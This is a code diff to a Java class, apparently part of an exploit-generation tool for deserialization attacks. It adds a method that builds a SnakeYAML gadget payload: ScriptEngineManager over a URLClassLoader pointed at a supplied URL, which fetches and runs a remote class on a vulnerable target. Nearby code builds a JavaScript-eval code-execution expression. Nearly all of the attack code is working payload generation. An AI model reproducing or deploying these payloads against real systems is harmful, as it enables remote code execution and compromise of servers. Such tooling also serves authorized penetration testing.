@@ -20,13 +20,11 @@ public class C3P0 {
      *
      * @param sinksHelper
      */
-    @EnchantType({EnchantType.DEFAULT, EnchantType.RemoteLoad})
+    @EnchantType({EnchantType.DEFAULT})
     public void remoteClassLoad(SinksHelper sinksHelper) {
         String url = sinksHelper.getUrl();
-        String remoteClassName = sinksHelper.getRemoteClassName();
 
         Printer.yellowInfo("Remote url: " + url);
-        Printer.yellowInfo("Remote class name: " + remoteClassName);
     }
 
     /**
@@ -107,4 +105,21 @@ public class C3P0 {
         String result = String.format("\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval('%s')", code);
         return result;
     }
+
+    @EnchantType({EnchantType.RemoteLoad})
+    public String remoteLoad(SinksHelper sinksHelper) {
+        String url = sinksHelper.getUrl();
+        String remoteClassName = sinksHelper.getRemoteClassName();
+
+        Printer.yellowInfo("Remote url: " + url);
+        Printer.yellowInfo("Remote class name: " + remoteClassName);
+
+        return String.format("!!javax.script.ScriptEngineManager [\n" +
+                "  !!java.net.URLClassLoader [[\n" +
+                "    !!java.net.URL [\"%s\"]\n" +
+                "  ]]\n" +
+                "]", url);
+    }
+
+
 }
